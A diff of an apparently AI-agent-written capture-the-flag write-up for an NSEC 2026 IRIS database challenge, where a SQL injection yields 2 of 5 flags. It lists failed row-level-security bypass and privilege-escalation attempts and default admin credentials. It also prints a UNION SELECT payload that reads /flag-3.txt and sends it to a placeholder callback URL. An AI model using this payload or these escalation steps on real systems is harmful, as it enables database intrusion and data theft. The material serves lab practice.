@@ -1,12 +1,12 @@
 +++
-title = "Monsatan Impact study — 2/5"
+title = "Monsatan Impact study - 2/5"
 date = 2026-05-20
 categories = ["nsec26"]
 tags = ["stuck", "web"]
 model = "Sonnet (default)"
 draft = false
 +++
-Status: **STUCK** — 2/5 sub-flags captured
+Status: **STUCK** - 2/5 sub-flags captured
 
 ## Context
 
@@ -37,7 +37,7 @@ _Preserved from pre-standardization writeup(s). May contain duplicate context._
 
 ## Monsatan Impact study (Topic 59546)
 
-Status: **STUCK** — 2/5 sub-flags captured
+Status: **STUCK** - 2/5 sub-flags captured
 
 ## Captures
 
@@ -84,56 +84,56 @@ Status: **STUCK** — 2/5 sub-flags captured
 - Tables (BLOCKED by RLS):
   - `Study.HiddenFlag` (id, flag VARCHAR(512)) - row count unknown
   - `Study.HiddenRecords` (sub_id, age, dist, cea, afp, src) - 150 rows expected (sub_id gaps 1-1000 minus 850 visible)
-- Stacked queries (`;`) **silently consumed** — only UNION SELECT executes.
+- Stacked queries (`;`) **silently consumed** - only UNION SELECT executes.
 - Any reference to `Study.HiddenFlag` or `Study.HiddenRecords` in FROM, JOIN, or subquery aborts the wrapping FastAPI try/except returning empty `rows=[]` (no 500).
 
 ## What was tried (none worked)
 - IRIS-specific hints: `%NOLOCK`, `%NOROWLEVEL`, `%NOFPLAN`, `%ALLINDEX`, `%FIRSTROW`, `/*+ NOROWLEVEL */`
 - Quoting variants: `"Study"."HiddenFlag"` (500 from server-side), `[Study].[HiddenFlag]`, `` `Study`.`HiddenFlag` ``, case variants, whitespace tricks
-- Subqueries: `(SELECT flag FROM Study.HiddenFlag ...)` in column, WHERE, EXISTS — all silently zero rows
-- JOINs/CTEs: cross join, left outer, lateral correlated — all blocked
-- Aggregates: `MAX`, `COUNT`, `LIST`, `COALESCE`, `IFNULL` — all blocked
-- Privilege escalation attempts: `GRANT SELECT`, `ALTER TABLE ADD READER`, `SET ROLE %ALL`, `CALL %SYS.SECURITY.SetSecurityUser`, INSERT INTO Flag SELECT FROM HiddenFlag — all stacked queries silently dropped
-- Class storage: `^Study.HiddenFlagD` global access via `%SYS.GlobalQuery_DataByRef`, `##class()`, `_Extent()`, `_OpenId()` — all return empty
-- IRIS proc calls: `%SQLCATALOG_TABLEINFO`, `SQLTableStatements`, `GetSQLStatement` — empty
-- Other endpoints: `/api/cases`, `/api/court`, `/api/registry`, `/api/docket`, `/api/admin`, `/csp/...` — all 404
-- Other HTTP methods (POST/PUT/DELETE on `/api/study-records`) — 405
-- Header-based identity: `X-User`, `X-Reader`, `Authorization: Bearer cristian.goliana` — no effect
-- PDF stream extraction — only XMP metadata exposes `cristian.goliana@agribiotechconsult.ctf`
-- `INFORMATION_SCHEMA.STATEMENTS.Statement` dump (53 statements) — only parameterized queries (`?`) and CREATE TABLE DDLs, no literal INSERTs with flag values
-- `INFORMATION_SCHEMA.STATEMENT_PARAMETER_STATS.Values` — 0 rows (param stats disabled)
-- `INFORMATION_SCHEMA.COLUMN_HISTOGRAMS.VALUE` — 0 rows (tables untuned)
+- Subqueries: `(SELECT flag FROM Study.HiddenFlag ...)` in column, WHERE, EXISTS - all silently zero rows
+- JOINs/CTEs: cross join, left outer, lateral correlated - all blocked
+- Aggregates: `MAX`, `COUNT`, `LIST`, `COALESCE`, `IFNULL` - all blocked
+- Privilege escalation attempts: `GRANT SELECT`, `ALTER TABLE ADD READER`, `SET ROLE %ALL`, `CALL %SYS.SECURITY.SetSecurityUser`, INSERT INTO Flag SELECT FROM HiddenFlag - all stacked queries silently dropped
+- Class storage: `^Study.HiddenFlagD` global access via `%SYS.GlobalQuery_DataByRef`, `##class()`, `_Extent()`, `_OpenId()` - all return empty
+- IRIS proc calls: `%SQLCATALOG_TABLEINFO`, `SQLTableStatements`, `GetSQLStatement` - empty
+- Other endpoints: `/api/cases`, `/api/court`, `/api/registry`, `/api/docket`, `/api/admin`, `/csp/...` - all 404
+- Other HTTP methods (POST/PUT/DELETE on `/api/study-records`) - 405
+- Header-based identity: `X-User`, `X-Reader`, `Authorization: Bearer cristian.goliana` - no effect
+- PDF stream extraction - only XMP metadata exposes `cristian.goliana@agribiotechconsult.ctf`
+- `INFORMATION_SCHEMA.STATEMENTS.Statement` dump (53 statements) - only parameterized queries (`?`) and CREATE TABLE DDLs, no literal INSERTs with flag values
+- `INFORMATION_SCHEMA.STATEMENT_PARAMETER_STATS.Values` - 0 rows (param stats disabled)
+- `INFORMATION_SCHEMA.COLUMN_HISTOGRAMS.VALUE` - 0 rows (tables untuned)
 
 ## Conclusion
-The RLS implementation is the gate. `svc_app` has no SELECT privilege on HiddenFlag / HiddenRecords, and the IRIS `Study.HiddenFlag` table likely uses class-level `READERS=` keyword referencing a different `$USERNAME` (probably `cristian.goliana` or `irisowner`). The Python wrapper executes prepared statements as `svc_app` exclusively — there is no auth surface to escalate or impersonate. Stacked queries are filtered by `dbapi.execute()` so we cannot grant ourselves the right.
+The RLS implementation is the gate. `svc_app` has no SELECT privilege on HiddenFlag / HiddenRecords, and the IRIS `Study.HiddenFlag` table likely uses class-level `READERS=` keyword referencing a different `$USERNAME` (probably `cristian.goliana` or `irisowner`). The Python wrapper executes prepared statements as `svc_app` exclusively - there is no auth surface to escalate or impersonate. Stacked queries are filtered by `dbapi.execute()` so we cannot grant ourselves the right.
 
 The puzzle "Court Registry | Health Impact Study Docket" is purely UI flavor; no separate `/api/cases` endpoint exists.
 
 ## Submitted
-- 1/5: `FLAG-nederlandsewetenschapsvlag` (already submitted prior agent — recon)
-- 2/5: `FLAG-490e9541f81f43bb9529ee0086c61e00` (already submitted prior agent — sqli)
-- 3/5, 4/5, 5/5: **NOT SUBMITTED** — gating mechanism (IRIS RLS) cannot be bypassed from the SVC_APP role through the available SQL injection surface. Need a different ingress vector (CSP login, OS-level access, or stolen credentials) that is not exposed.
+- 1/5: `FLAG-nederlandsewetenschapsvlag` (already submitted prior agent - recon)
+- 2/5: `FLAG-490e9541f81f43bb9529ee0086c61e00` (already submitted prior agent - sqli)
+- 3/5, 4/5, 5/5: **NOT SUBMITTED** - gating mechanism (IRIS RLS) cannot be bypassed from the SVC_APP role through the available SQL injection surface. Need a different ingress vector (CSP login, OS-level access, or stolen credentials) that is not exposed.
 
 ## Session 3 (2026-05-17) - Round 6 Exhaustive Findings
 
 **New discoveries:**
 - Records has sub_ids 1..1000 with **150 gaps** (850 rows). Sub_id 14 is the first gap (per Discourse hint "where is sub_id #14?"). Gaps include: 14, 25, 29, 33, 42, 955, 956, 958, 968, 971, 973, 977, 985, 987, 998, and ~135 more.
-- **HiddenRecords appears to hold the 150 missing sub_ids** — but RLS blocks ALL access.
-- All 92 SQL-accessible routines enumerated. Notable: `%Library.SQLCatalogPriv_SQLUsers()`, `Ens.StudioManager_ClassList`, `%ML_H2O.Provider_getModel`, `INFORMATION_SCHEMA.GetSQLStatement` — all return 0 rows for svc_app.
+- **HiddenRecords appears to hold the 150 missing sub_ids** - but RLS blocks ALL access.
+- All 92 SQL-accessible routines enumerated. Notable: `%Library.SQLCatalogPriv_SQLUsers()`, `Ens.StudioManager_ClassList`, `%ML_H2O.Provider_getModel`, `INFORMATION_SCHEMA.GetSQLStatement` - all return 0 rows for svc_app.
 - `INFORMATION_SCHEMA.SCHEMATA` shows 14 schemas: `%DeepSee_SQL`, `%Library`, `%ML_H2O`, `%SQL_Diag`, `%SQL_Util`, `%SYSTEM`, `%SYSTEM_SQL`, `%SYS_ML`, `%SYS_Monitor_Interop`, `%TSQL`, `Ens`, `Ens_DTL`, `INFORMATION_SCHEMA`, `Study`.
 - **Ensemble is installed** (`Ens`, `Ens_DTL` schemas) but no accessible tables.
 - %SQL_Diag and %SYS_Monitor_Interop tables return 0 rows.
 - Current namespace: `USER` (not `Study`). SQL user: `svc_app`.
-- The IRIS `##class()` method call syntax in SQL returns NULL (0 rows) for all class methods due to missing SqlProc=1 projection — only special variables ($ZVERSION, $JOB, USER) and SQL built-ins (UPPER, LENGTH, NOW) work in UNION SELECT.
+- The IRIS `##class()` method call syntax in SQL returns NULL (0 rows) for all class methods due to missing SqlProc=1 projection - only special variables ($ZVERSION, $JOB, USER) and SQL built-ins (UPPER, LENGTH, NOW) work in UNION SELECT.
 - PyBridge.Execute() with single-quoted Python strings returns 0 rows (method exists but returns NULL to SQL).
 - PyBridge.Execute() with double-quoted Python strings causes `<SYNTAX>zExec+2^Utils.PyBridge.1` 500 error (IRIS SQL interprets double quotes as identifiers).
-- `%Library.File_FileSet()` returns 0 rows for `/tmp`, `/root`, `/home`, `/app`, `/opt`, `/var/iris`, `/usr/irissys`, `/proc/self/root` — only the root `/` listing worked in prior sessions.
+- `%Library.File_FileSet()` returns 0 rows for `/tmp`, `/root`, `/home`, `/app`, `/opt`, `/var/iris`, `/usr/irissys`, `/proc/self/root` - only the root `/` listing worked in prior sessions.
 - study.pdf: no embedded files, no flag strings in decompressed streams, no credentials in any PDF streams.
 - **VPN dropped** mid-session at ~16:30 UTC on 2026-05-17.
 
 **All vectors exhausted within svc_app SQL context:**
-1. RLS bypass: impossible — IRIS RLS appends WHERE clause at engine level for every query variant
-2. File read: impossible — svc_app lacks %Stream.FileCharacter and all file read primitives
+1. RLS bypass: impossible - IRIS RLS appends WHERE clause at engine level for every query variant
+2. File read: impossible - svc_app lacks %Stream.FileCharacter and all file read primitives
 3. PyBridge Python execution: no return value channel from Python to SQL, file reads blocked at Python runtime level
 4. Shell execution: all system call variants return NULL
 5. HTTP from IRIS: all %Net.HttpRequest forms return NULL (method not SqlProc projected)
@@ -146,18 +146,18 @@ The puzzle "Court Registry | Health Impact Study Docket" is purely UI flavor; no
 **Required: privileged user credentials or alternate attack surface**
 
 Top unexplored angles when VPN reconnects:
-1. **agrobiotechconsult.ctf blog scrape** — check ALL pages for flags. The blog that gave Flag 1 may have more pages. DNS resolution resolves from inside CTF network but not Windows host.
-2. **IRIS Management Portal at port 52773** — if default credentials (SuperUser/SYS) work, can run SQL as admin and bypass RLS. Port not externally accessible but could be reached via SSRF if an IRIS-internal HTTP route exists.
-3. **PyBridge OOB exfil**: Use PyBridge.Execute to POST flag content to shell.ctf (IPv6 HTTP callback). The Python runtime CAN write outbound even if it can't write to disk.  Single-quoted Python:  `0 UNION SELECT ##class(Utils.PyBridge).Execute('import urllib.request; urllib.request.urlopen(''http://CALLBACK_URL/?d=''+open(''/flag-3.txt'').read())'),'x','x','x','x','x'--`  — requires an HTTP listener on a reachable IPv6 address.
+1. **agrobiotechconsult.ctf blog scrape** - check ALL pages for flags. The blog that gave Flag 1 may have more pages. DNS resolution resolves from inside CTF network but not Windows host.
+2. **IRIS Management Portal at port 52773** - if default credentials (SuperUser/SYS) work, can run SQL as admin and bypass RLS. Port not externally accessible but could be reached via SSRF if an IRIS-internal HTTP route exists.
+3. **PyBridge OOB exfil**: Use PyBridge.Execute to POST flag content to shell.ctf (IPv6 HTTP callback). The Python runtime CAN write outbound even if it can't write to disk.  Single-quoted Python:  `0 UNION SELECT ##class(Utils.PyBridge).Execute('import urllib.request; urllib.request.urlopen(''http://CALLBACK_URL/?d=''+open(''/flag-3.txt'').read())'),'x','x','x','x','x'--`  - requires an HTTP listener on a reachable IPv6 address.
 4. **Cross-challenge credential reuse**: irisowner password might appear in fossilco, prestige-arboretum, or other NSEC challenges that have IRIS or credential dumps.
 5. **The Discourse sub_id #14 hint** may indicate HiddenRecords stores data for the "missing" patients. A SELECT of sub_id values not in Records might be the intended HiddenRecords query but RLS still blocks it from svc_app.
 
-**Study.Flag note:** Only 1 row (`FLAG-490e9541f81f43bb9529ee0086c61e00 (2/5)`). The `(2/5)` is part of the flag display value — suggests the challenge designer numbered them. HiddenFlag likely has `(3/5)`, `(4/5)`, `(5/5)` flags.
+**Study.Flag note:** Only 1 row (`FLAG-490e9541f81f43bb9529ee0086c61e00 (2/5)`). The `(2/5)` is part of the flag display value - suggests the challenge designer numbered them. HiddenFlag likely has `(3/5)`, `(4/5)`, `(5/5)` flags.
 
 ## Submitted
 - 1/5: `FLAG-nederlandsewetenschapsvlag` (already submitted)
 - 2/5: `FLAG-490e9541f81f43bb9529ee0086c61e00` (already submitted)
-- 3/5, 4/5, 5/5: **NOT SUBMITTED** — requires privileged IRIS access not available via svc_app SQL injection
+- 3/5, 4/5, 5/5: **NOT SUBMITTED** - requires privileged IRIS access not available via svc_app SQL injection
 
 
 ---
@@ -173,8 +173,8 @@ Top unexplored angles when VPN reconnects:
 > honeypots_avoided: 0
 >
 > Notable:
-> - **Agent-1** (Sonnet (default)) — 229.7m: Monsatan Impact 3/5 IRIS — 229.7 minutes enumerating 14 schemas + 92 SQL routines + PyBridge return-channel analysis; concluded RLS engine-level block
-> - **Agent-2** (Sonnet (default)) — 87.0m: Impact Study flags 3-5 exploitation — InterSystems internals + INFORMATION_SCHEMA.STATEMENTS deep mine, 87 minutes
+> - **Agent-1** (Sonnet (default)) - 229.7m: Monsatan Impact 3/5 IRIS - 229.7 minutes enumerating 14 schemas + 92 SQL routines + PyBridge return-channel analysis; concluded RLS engine-level block
+> - **Agent-2** (Sonnet (default)) - 87.0m: Impact Study flags 3-5 exploitation - InterSystems internals + INFORMATION_SCHEMA.STATEMENTS deep mine, 87 minutes
 >
 > _Two flags landed; positions 3-5 STUCK behind IRIS RLS-WHERE-clause-engine boundary._
 
